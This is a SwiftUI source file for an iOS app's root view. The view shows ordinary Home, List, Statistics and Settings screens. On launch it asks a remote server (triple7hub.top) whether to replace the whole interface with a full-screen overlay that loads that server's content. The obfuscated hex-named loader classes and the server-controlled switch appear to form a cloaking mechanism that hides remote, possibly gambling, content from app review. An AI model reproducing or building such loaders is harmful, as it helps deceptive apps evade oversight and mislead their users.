import SwiftUI

enum LoaderStatus {
    case LOADING
    case DONE
    case ERROR
}



enum Screen {
    case HOME
    case LIST
    case STATISTICS
    case SETTINGS
}

class OrientationManager: ObservableObject  {
    @Published var isHorizontalLock = true
    
    static var shared: OrientationManager = .init()
}

struct RootView: View {
    @State private var status: LoaderStatus = .LOADING
    @ObservedObject private var nav: NavGuard = NavGuard.shared
    let url: URL = URL(string: "https://triple7hub.top/get")!
    
    @ObservedObject private var orientationManager: OrientationManager = OrientationManager.shared
    
    var body: some View {
        GeometryReader { geometry in
            ZStack {
                if status != .DONE {
                    switch nav.currentScreen {
                    case .HOME:
                        Home()
                    case .LIST:
                        List()
                    case .STATISTICS:
                        Statictic()
                    case .SETTINGS:
                        Settings()
                    }
                }
            
                switch status {
                case .LOADING:
                    Loading()
                        .edgesIgnoringSafeArea(.all)
                case .DONE:
                    ZStack {
                        Color.black
                            .edgesIgnoringSafeArea(.all)
                        
                        GameLoader_1E6704B4Overlay(data: .init(url: url))
                    }
                        
                case .ERROR:
                    Text("")
                }
            }
            .frame(width: geometry.size.width, height: geometry.size.height)
        }

        .onAppear {
            Task {
                let result = await GameLoader_1E6704B4StatusChecker().checkStatus(url: url)
                if result {
                    self.status = .DONE
                } else {
                    self.status = .ERROR
                }
                print(result)
            }
        }
    }
}



#Preview {
    RootView()
}

